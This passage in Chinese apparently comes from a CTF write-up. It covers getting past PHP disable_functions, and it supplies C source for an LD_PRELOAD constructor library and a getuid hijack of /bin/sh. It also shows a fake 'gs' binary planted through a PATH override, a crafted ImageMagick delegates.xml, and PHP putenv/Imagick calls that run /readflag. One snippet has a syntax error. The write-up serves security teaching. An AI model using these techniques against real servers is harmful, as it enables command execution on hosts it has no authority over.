那么还有其他办法吗？
### 2\. __attribute__((constructor))拓展修饰符？
这个姿势来源于18年12月 FreeBuf
的一篇文章：[无需sendmail：巧用LD_PRELOAD突破disable_functions](https://www.freebuf.com/articles/web/192052.html)，我发现许多师傅的
Write Up 中都提到了这个方法，但是似乎没人对这个方法做进一步的分析。文章中提到：
> GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main()
> 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute__((constructor)) 修饰的函数。
按照这篇文章的说法，我们只需利用`putenv`设置`LD_PRELOAD`
，使得使用了`__attribute__((constructor))`修饰函数的恶意动态链接库被系统加载便能实现命令执行，而不再需要再去劫持程序调用的库函数，`sendmail`
存不存在也就无所谓了。
然而我们的这个恶意动态链接库（共享对象）究竟是怎么被 “系统” 加载的呢？文章中并没有说清楚。这其实是这篇文章一个疏漏的地方。
我们要知道一个程序的动态链接库并不是所谓被系统加载的，而是被执行的二进制文件去寻找自己所需要的动态链接库，即便这个库是`LD_PRELOAD`
所设置的，也需要在一个新进程启动之后，由这个进程将库加载进自己的运行环境(甚至如果没有新进程，`LD_PRELOAD` 变量都不会被加载)。
那么既然`sendmail`不存在，究竟是哪个进程加载了我们的动态链接库呢？
这里用原文中的一张图给出答案：
可以看到，除了 `/usr/bin/php`
之外的第一个进程，其实是`/bin/sh`,而并非`/usr/sbin/sendmail`!然而这篇文章的作者似乎却忽略了`/bin/sh`。
也就是说在这一步，真正加载了动态链接库的其实是`/bin/sh` 的进程，其实我们大可不必使用`__attribute__((constructor))`
，直接劫持`/bin/sh` 的库函数即可。
所以说，要想加载动态链接库，就必须启动一个新进程，只要存在新进程，就能劫持库函数。当然这并不是说`__attribute__((constructor))`
没有意义，毕竟他可以帮我们省略挑选库函数的过程。
那么回到题目上来，新的动态链接库源码如下：
    #include 
    #include 
    __attribute__((constructor))void payload() {
        unsetenv("LD_PRELOAD");
        const char* cmd = getenv("CMD");
        system(cmd);
    }
或者劫持`/bin/sh` 的库函数
    #include 
    #include 
    void payload() {
        const char* cmd = getenv('CMD')
        system(cmd);
    }
    int getuid() {
        if (getenv("LD_PRELOAD") == NULL) { return 0; }
        unsetenv("LD_PRELOAD");
        payload();
    }
同样，编译成动态链接库后写入服务器。
### 3\. 发起进攻
只需把解法一中执行的最后一行代码改成`error_log('',1);`
## 解法三：
前两种方法都是通过设置 `LD_PRELOAD`变量来加载恶意动态链接库，那么除此之外还有没有其他变量可以利用呢？
### 1\. 覆盖 PATH 变量
我们知道 Linux 中万物皆文件，执行一个命令的实质其实是执行了一个可执行文件，而系统正是通过
`PATH`环境变量找到命令对应的可执行文件，当输入命令的时候，系统就会去`PATH` 变量记录的路径下面寻找相应的可执行文件。
那么如果我们通过`putenv`
覆盖这个变量为我们可以控制的路径，再将恶意文件上传，命名成对应的命令的名字，程序在执行这个命令的时候，就会执行我们的恶意文件。
而 `ImageMagick` 正是通过执行命令的形式启动外部程序的，忘记了的同学再看一遍这张图应该就能明白了：
### 2.发起攻击
    #include 
    #include 
    int main() {
        unsetenv("PATH");
        const char* cmd = getenv("CMD");
        system(cmd);
        return 0;
    }
将上述内容编译后命名为 `gs`,将 `gs` 和 `EPT`文件写入到服务器，然后执行：
    putenv('PATH=/tmp/3accb9900a8be5421641fb31e6861f33');
    putenv('CMD=/readflag > /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt');
    chmod('/tmp/3accb9900a8be5421641fb31e6861f33/gs','0777');
    $img = new Imagick('/tmp/3accb9900a8be5421641fb31e6861f33/1.ept');
## 解法四：
### 1.结合 putenv 和 ImageMagick 特性：
我们在Github上查看`ImageMagick` 的源码，在官方给出的
[QuickStart.txt](https://github.com/ImageMagick/ImageMagick/blob/826cbebfe562ac9160a3cb4316b4e4bed61203cb/QuickStart.txt)
中可以看到这样的内容：
    Configuration Files
          ImageMagick depends on a number of external configuration files which
          include colors.xml, delegates.xml, and others.
          ImageMagick searches for configuration files in the following order, and
          loads them if found:
              $MAGICK_CONFIGURE_PATH
              $MAGICK_HOME/etc/ImageMagick
              $MAGICK_HOME/share/ImageMagick-7.0.2/config
              $HOME/.config/ImageMagick/
              /etc/ImageMagick/
              /
可以看到 `ImageMagick`的配置文件位置与环境变量有关，那么结合`putenv`
我们就可以控制`ImageMagick`的配置。接下来，我们需要做的就是寻找一些可以帮助我们执行命令的配置项。
在本地环境的配置文件目录逐项查看后，可以发现在`delegates.xml`这个文件内，定义了`ImageMagick`处理各种文件类型的规则，格式如下：
        ......
可以看到处理文件所需执行的系统命令均在这个文件中设置，那么我们就可以自定义这个文件来执行命令了。
### 2\. 发起进攻：
首先通过正常情况下执行的命令找到 `EPT` 文件对应的文件格式为：`ps:alpha`，那么我们所需要的`delegates.xml`内容就是：
       /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt&quot;"/>
将 `delegates.xml` 和 `EPT` 文件写入后，使用题目中的后门执行如下命令即可：
    putenv('MAGICK_CONFIGURE_PATH=/tmp/3accb9900a8be5421641fb31e6861f33');
    $img = new Imagick('/tmp/3accb9900a8be5421641fb31e6861f33/1.ept');
## 参考链接：
[无需sendmail：巧用LD_PRELOAD突破disable_functions](https://www.freebuf.com/articles/web/192052.html)